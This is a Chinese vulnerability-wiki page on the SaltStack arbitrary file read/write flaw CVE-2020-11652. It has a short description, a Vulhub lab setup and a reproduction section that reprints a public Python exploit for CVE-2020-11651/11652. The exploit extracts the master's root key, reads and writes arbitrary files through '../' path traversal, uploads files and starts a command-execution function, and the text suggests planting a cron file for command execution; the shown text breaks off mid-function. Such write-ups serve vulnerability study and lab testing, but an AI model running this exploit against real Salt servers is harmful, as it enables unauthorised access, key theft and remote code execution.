<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/SaltStack%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%BC%8F%E6%B4%9E%20CVE-2020-11652/">
    <link rel="shortcut icon" href="../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>SaltStack 任意文件读写漏洞 CVE-2020-11652 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../js/jquery-3.2.1.min.js"></script>
    <script src="../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "SaltStack \u4efb\u610f\u6587\u4ef6\u8bfb\u5199\u6f0f\u6d1e CVE-2020-11652", url: "#_top", children: [
              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
          ]},
        ];

    </script>
    <script src="../../js/base.js"></script>
      <script src="../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../SaltStack%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-16846/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../SaltStack%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-16846/" class="btn btn-xs btn-link">
        SaltStack 命令注入漏洞 CVE-2020-16846
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../SaltStack%20Minion%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2021-31607/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../SaltStack%20Minion%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2021-31607/" class="btn btn-xs btn-link">
        SaltStack Minion 命令注入漏洞 CVE-2021-31607
      </a>
    </div>
    
  </div>

    

    <h1 id="saltstack-cve-2020-11652">SaltStack 任意文件读写漏洞 CVE-2020-11652<a class="headerlink" href="#saltstack-cve-2020-11652" title="Permanent link">&para;</a></h1>
<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>SaltStack 是基于 Python 开发的一套C/S架构配置管理工具。国外某安全团队披露了 SaltStack 存在认证绕过漏洞（CVE-2020-11651）和目录遍历漏洞（CVE-2020-11652）。</p>
<p>在 CVE-2020-11652 目录遍历漏洞中，攻击者通过构造恶意请求，可以读取、写入服务器上任意文件。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://labs.f-secure.com/advisories/saltstack-authorization-bypass">https://labs.f-secure.com/advisories/saltstack-authorization-bypass</a></li>
<li><a href="https://github.com/rossengeorgiev/salt-security-backports">https://github.com/rossengeorgiev/salt-security-backports</a></li>
<li><a href="https://github.com/jasperla/CVE-2020-11651-poc">https://github.com/jasperla/CVE-2020-11651-poc</a></li>
</ul>
<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Vulhub执行如下命令启动一个SaltStack Master服务：</p>
<div class="highlight"><pre><span></span><code>docker-compose up -d
</code></pre></div>
<p>环境启动后，将会在本地监听如下端口：</p>
<ul>
<li>4505/4506 这是SaltStack Master与minions通信的端口</li>
<li>8000 这是Salt的API端口</li>
<li>2222 这是容器内部的SSH服务器监听的端口</li>
</ul>
<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>本文档复现CVE-2020-11652漏洞，参考漏洞作者的说明：</p>
<blockquote>
<p>The wheel module contains commands used to read and write files under specific directory paths. The inputs to these functions are concatenated with the target directory and the resulting path is not canonicalized, leading to an escape of the intended path restriction.</p>
</blockquote>
<p>wheel/file_roots.py文件中的write方法，使用<code>os.path.isabs</code>来判断用户输入是否是绝对路径，可能目的是防止写入其他目录，但实际上攻击者可以通过<code>../</code>的方式跳转至根目录，进而写入任意文件：</p>
<div class="highlight"><pre><span></span><code>msg = {
    &#39;key&#39;: root_key,
    &#39;cmd&#39;: &#39;wheel&#39;,
    &#39;fun&#39;: &#39;file_roots.write&#39;,
    &#39;path&#39;: &#39;../../path/to/target&#39;,
    &#39;data&#39;: &#39;test&#39;
#    &#39;saltenv&#39;: &#39;base&#39;,
  }
</code></pre></div>
<p>参考<a href="https://github.com/rossengeorgiev/salt-security-backports">这个项目</a>，编写一个简单的POC，写入<code>/etc/cron.d/shell</code>，利用crontab执行任意命令。</p>
<p>也可以通过这个<a href="https://github.com/jasperla/CVE-2020-11651-poc">POC</a>来复现该漏洞，如下：</p>
<div class="highlight"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
<span class="c1">#</span>
<span class="c1"># Exploit for CVE-2020-11651 and CVE-2020-11652</span>
<span class="c1"># Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc)</span>
<span class="c1"># This exploit is based on this checker script:</span>
<span class="c1"># https://github.com/rossengeorgiev/salt-security-backports</span>

<span class="kn">from</span><span class="w"> </span><span class="nn">__future__</span><span class="w"> </span><span class="kn">import</span> <span class="n">absolute_import</span><span class="p">,</span> <span class="n">print_function</span><span class="p">,</span> <span class="n">unicode_literals</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">argparse</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">datetime</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">os.path</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>

<span class="kn">import</span><span class="w"> </span><span class="nn">salt</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">salt.version</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">salt.transport.client</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">salt.exceptions</span>

<span class="k">def</span><span class="w"> </span><span class="nf">init_minion</span><span class="p">(</span><span class="n">master_ip</span><span class="p">,</span> <span class="n">master_port</span><span class="p">):</span>
    <span class="n">minion_config</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;transport&#39;</span><span class="p">:</span> <span class="s1">&#39;zeromq&#39;</span><span class="p">,</span>
        <span class="s1">&#39;pki_dir&#39;</span><span class="p">:</span> <span class="s1">&#39;/tmp&#39;</span><span class="p">,</span>
        <span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span>
        <span class="s1">&#39;log_level&#39;</span><span class="p">:</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span>
        <span class="s1">&#39;master_ip&#39;</span><span class="p">:</span> <span class="n">master_ip</span><span class="p">,</span>
        <span class="s1">&#39;master_port&#39;</span><span class="p">:</span> <span class="n">master_port</span><span class="p">,</span>
        <span class="s1">&#39;auth_timeout&#39;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span>
        <span class="s1">&#39;auth_tries&#39;</span><span class="p">:</span> <span class="mi">1</span><span class="p">,</span>
        <span class="s1">&#39;master_uri&#39;</span><span class="p">:</span> <span class="s1">&#39;tcp://</span><span class="si">{0}</span><span class="s1">:</span><span class="si">{1}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">master_ip</span><span class="p">,</span> <span class="n">master_port</span><span class="p">)</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">salt</span><span class="o">.</span><span class="n">transport</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">ReqChannel</span><span class="o">.</span><span class="n">factory</span><span class="p">(</span><span class="n">minion_config</span><span class="p">,</span> <span class="n">crypt</span><span class="o">=</span><span class="s1">&#39;clear&#39;</span><span class="p">)</span>

<span class="c1"># --- check funcs ----</span>

<span class="k">def</span><span class="w"> </span><span class="nf">check_connection</span><span class="p">(</span><span class="n">master_ip</span><span class="p">,</span> <span class="n">master_port</span><span class="p">,</span> <span class="n">channel</span><span class="p">):</span>
  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Checking salt-master (</span><span class="si">{}</span><span class="s2">:</span><span class="si">{}</span><span class="s2">) status... &quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">master_ip</span><span class="p">,</span> <span class="n">master_port</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>

  <span class="c1"># connection check</span>
  <span class="k">try</span><span class="p">:</span>
    <span class="n">channel</span><span class="o">.</span><span class="n">send</span><span class="p">({</span><span class="s1">&#39;cmd&#39;</span><span class="p">:</span><span class="s1">&#39;ping&#39;</span><span class="p">},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
  <span class="k">except</span> <span class="n">salt</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">SaltReqTimeoutError</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;OFFLINE&quot;</span><span class="p">)</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ONLINE&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">check_CVE_2020_11651</span><span class="p">(</span><span class="n">channel</span><span class="p">):</span>
  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Checking if vulnerable to CVE-2020-11651... &quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>

  <span class="k">try</span><span class="p">:</span>
    <span class="n">rets</span> <span class="o">=</span> <span class="n">channel</span><span class="o">.</span><span class="n">send</span><span class="p">({</span><span class="s1">&#39;cmd&#39;</span><span class="p">:</span> <span class="s1">&#39;_prep_auth_info&#39;</span><span class="p">},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
  <span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;ERROR&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="kc">None</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">pass</span>
  <span class="k">finally</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">rets</span><span class="p">:</span>
      <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;YES&#39;</span><span class="p">)</span>
      <span class="n">root_key</span> <span class="o">=</span> <span class="n">rets</span><span class="p">[</span><span class="mi">2</span><span class="p">][</span><span class="s1">&#39;root&#39;</span><span class="p">]</span>
      <span class="k">return</span> <span class="n">root_key</span>

  <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;NO&#39;</span><span class="p">)</span>
  <span class="k">return</span> <span class="kc">None</span>

<span class="k">def</span><span class="w"> </span><span class="nf">check_CVE_2020_11652_read_token</span><span class="p">(</span><span class="n">debug</span><span class="p">,</span> <span class="n">channel</span><span class="p">,</span> <span class="n">top_secret_file_path</span><span class="p">):</span>
  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Checking if vulnerable to CVE-2020-11652 (read_token)... &quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>

  <span class="c1"># try read file</span>
  <span class="n">msg</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;cmd&#39;</span><span class="p">:</span> <span class="s1">&#39;get_token&#39;</span><span class="p">,</span>
    <span class="s1">&#39;arg&#39;</span><span class="p">:</span> <span class="p">[],</span>
    <span class="s1">&#39;token&#39;</span><span class="p">:</span> <span class="n">top_secret_file_path</span><span class="p">,</span>
  <span class="p">}</span>

  <span class="k">try</span><span class="p">:</span>
    <span class="n">rets</span> <span class="o">=</span> <span class="n">channel</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
  <span class="k">except</span> <span class="n">salt</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">SaltReqTimeoutError</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;YES&quot;</span><span class="p">)</span>
  <span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ERROR&quot;</span><span class="p">)</span>
    <span class="k">raise</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
      <span class="nb">print</span><span class="p">()</span>
      <span class="nb">print</span><span class="p">(</span><span class="n">rets</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;NO&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">check_CVE_2020_11652_read</span><span class="p">(</span><span class="n">debug</span><span class="p">,</span> <span class="n">channel</span><span class="p">,</span> <span class="n">top_secret_file_path</span><span class="p">,</span> <span class="n">root_key</span><span class="p">):</span>
  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Checking if vulnerable to CVE-2020-11652 (read)... &quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>

  <span class="c1"># try read file</span>
  <span class="n">msg</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="n">root_key</span><span class="p">,</span>
    <span class="s1">&#39;cmd&#39;</span><span class="p">:</span> <span class="s1">&#39;wheel&#39;</span><span class="p">,</span>
    <span class="s1">&#39;fun&#39;</span><span class="p">:</span> <span class="s1">&#39;file_roots.read&#39;</span><span class="p">,</span>
    <span class="s1">&#39;path&#39;</span><span class="p">:</span> <span class="n">top_secret_file_path</span><span class="p">,</span>
    <span class="s1">&#39;saltenv&#39;</span><span class="p">:</span> <span class="s1">&#39;base&#39;</span><span class="p">,</span>
  <span class="p">}</span>

  <span class="k">try</span><span class="p">:</span>
    <span class="n">rets</span> <span class="o">=</span> <span class="n">channel</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
  <span class="k">except</span> <span class="n">salt</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">SaltReqTimeoutError</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;TIMEOUT&quot;</span><span class="p">)</span>
  <span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ERROR&quot;</span><span class="p">)</span>
    <span class="k">raise</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
      <span class="nb">print</span><span class="p">()</span>
      <span class="nb">print</span><span class="p">(</span><span class="n">rets</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">rets</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;return&#39;</span><span class="p">]:</span>
      <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;YES&quot;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
      <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;NO&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">check_CVE_2020_11652_write1</span><span class="p">(</span><span class="n">debug</span><span class="p">,</span> <span class="n">channel</span><span class="p">,</span> <span class="n">root_key</span><span class="p">):</span>
  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Checking if vulnerable to CVE-2020-11652 (write1)... &quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>

  <span class="c1"># try read file</span>
  <span class="n">msg</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="n">root_key</span><span class="p">,</span>
    <span class="s1">&#39;cmd&#39;</span><span class="p">:</span> <span class="s1">&#39;wheel&#39;</span><span class="p">,</span>
    <span class="s1">&#39;fun&#39;</span><span class="p">:</span> <span class="s1">&#39;file_roots.write&#39;</span><span class="p">,</span>
    <span class="s1">&#39;path&#39;</span><span class="p">:</span> <span class="s1">&#39;../../../../../../../../tmp/salt_CVE_2020_11652&#39;</span><span class="p">,</span>
    <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="s1">&#39;evil&#39;</span><span class="p">,</span>
    <span class="s1">&#39;saltenv&#39;</span><span class="p">:</span> <span class="s1">&#39;base&#39;</span><span class="p">,</span>
  <span class="p">}</span>

  <span class="k">try</span><span class="p">:</span>
    <span class="n">rets</span> <span class="o">=</span> <span class="n">channel</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
  <span class="k">except</span> <span class="n">salt</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">SaltReqTimeoutError</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;TIMEOUT&quot;</span><span class="p">)</span>
  <span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ERROR&quot;</span><span class="p">)</span>
    <span class="k">raise</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
      <span class="nb">print</span><span class="p">()</span>
      <span class="nb">print</span><span class="p">(</span><span class="n">rets</span><span class="p">)</span>

    <span class="n">pp</span><span class="p">(</span><span class="n">rets</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">rets</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;return&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;Wrote&#39;</span><span class="p">):</span>
      <span class="k">try</span><span class="p">:</span>
        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;/tmp/salt_CVE_2020_11652&#39;</span><span class="p">)</span>
      <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Maybe?&quot;</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;YES&quot;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
      <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;NO&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">check_CVE_2020_11652_write2</span><span class="p">(</span><span class="n">debug</span><span class="p">,</span> <span class="n">channel</span><span class="p">,</span> <span class="n">root_key</span><span class="p">):</span>
  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Checking if vulnerable to CVE-2020-11652 (write2)... &quot;</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
  <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>

  <span class="c1"># try read file</span>
  <span class="n">msg</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="n">root_key</span><span class="p">,</span>
    <span class="s1">&#39;cmd&#39;</span><span class="p">:</span> <span class="s1">&#39;wheel&#39;</span><span class="p">,</span>
    <span class="s1">&#39;fun&#39;</span><span class="p">:</span> <span class="s1">&#39;config.update_config&#39;</span><span class="p">,</span>
    <span class="s1">&#39;file_name&#39;</span><span class="p">:</span> <span class="s1">&#39;../../../../../../../../tmp/salt_CVE_2020_11652&#39;</span><span class="p">,</span>
    <span class="s1">&#39;yaml_contents&#39;</span><span class="p">:</span> <span class="s1">&#39;evil&#39;</span><span class="p">,</span>
    <span class="s1">&#39;saltenv&#39;</span><span class="p">:</span> <span class="s1">&#39;base&#39;</span><span class="p">,</span>
  <span class="p">}</span>

  <span class="k">try</span><span class="p">:</span>
    <span class="n">rets</span> <span class="o">=</span> <span class="n">channel</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
  <span class="k">except</span> <span class="n">salt</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">SaltReqTimeoutError</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;TIMEOUT&quot;</span><span class="p">)</span>
  <span class="k">except</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;ERROR&quot;</span><span class="p">)</span>
    <span class="k">raise</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
      <span class="nb">print</span><span class="p">()</span>
      <span class="nb">print</span><span class="p">(</span><span class="n">rets</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">rets</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;return&#39;</span><span class="p">]</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39;Wrote&#39;</span><span class="p">):</span>
      <span class="k">try</span><span class="p">:</span>
        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;/tmp/salt_CVE_2020_11652.conf&#39;</span><span class="p">)</span>
      <span class="k">except</span> <span class="ne">OSError</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Maybe?&quot;</span><span class="p">)</span>
      <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;YES&quot;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
      <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;NO&quot;</span><span class="p">)</span>

<span class="k">def</span><span class="w"> </span><span class="nf">pwn_read_file</span><span class="p">(</span><span class="n">channel</span><span class="p">,</span> <span class="n">root_key</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="n">master_ip</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Attemping to read </span><span class="si">{}</span><span class="s2"> from </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">master_ip</span><span class="p">))</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>

    <span class="n">msg</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="n">root_key</span><span class="p">,</span>
        <span class="s1">&#39;cmd&#39;</span><span class="p">:</span> <span class="s1">&#39;wheel&#39;</span><span class="p">,</span>
        <span class="s1">&#39;fun&#39;</span><span class="p">:</span> <span class="s1">&#39;file_roots.read&#39;</span><span class="p">,</span>
        <span class="s1">&#39;path&#39;</span><span class="p">:</span> <span class="n">path</span><span class="p">,</span>
        <span class="s1">&#39;saltenv&#39;</span><span class="p">:</span> <span class="s1">&#39;base&#39;</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="n">rets</span> <span class="o">=</span> <span class="n">channel</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">rets</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;return&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="n">path</span><span class="p">])</span>

<span class="k">def</span><span class="w"> </span><span class="nf">pwn_upload_file</span><span class="p">(</span><span class="n">channel</span><span class="p">,</span> <span class="n">root_key</span><span class="p">,</span> <span class="n">src</span><span class="p">,</span> <span class="n">dest</span><span class="p">,</span> <span class="n">master_ip</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Attemping to upload </span><span class="si">{}</span><span class="s2"> to </span><span class="si">{}</span><span class="s2"> on </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dest</span><span class="p">,</span> <span class="n">master_ip</span><span class="p">))</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">fh</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span>
        <span class="n">payload</span> <span class="o">=</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
        <span class="n">fh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Failed to read </span><span class="si">{}</span><span class="s1">: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">e</span><span class="p">))</span>
        <span class="k">return</span>

    <span class="n">msg</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="n">root_key</span><span class="p">,</span>
        <span class="s1">&#39;cmd&#39;</span><span class="p">:</span> <span class="s1">&#39;wheel&#39;</span><span class="p">,</span>
        <span class="s1">&#39;fun&#39;</span><span class="p">:</span> <span class="s1">&#39;file_roots.write&#39;</span><span class="p">,</span>
        <span class="s1">&#39;saltenv&#39;</span><span class="p">:</span> <span class="s1">&#39;base&#39;</span><span class="p">,</span>
        <span class="s1">&#39;data&#39;</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
        <span class="s1">&#39;path&#39;</span><span class="p">:</span> <span class="n">dest</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="n">rets</span> <span class="o">=</span> <span class="n">channel</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[ ] </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">rets</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">][</span><span class="s1">&#39;return&#39;</span><span class="p">]))</span>

<span class="k">def</span><span class="w"> </span><span class="nf">pwn_exec</span><span class="p">(</span><span class="n">channel</span><span class="p">,</span> <span class="n">root_key</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">master_ip</span><span class="p">,</span> <span class="n">jid</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Attemping to execute </span><span class="si">{}</span><span class="s2"> on </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">master_ip</span><span class="p">))</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>

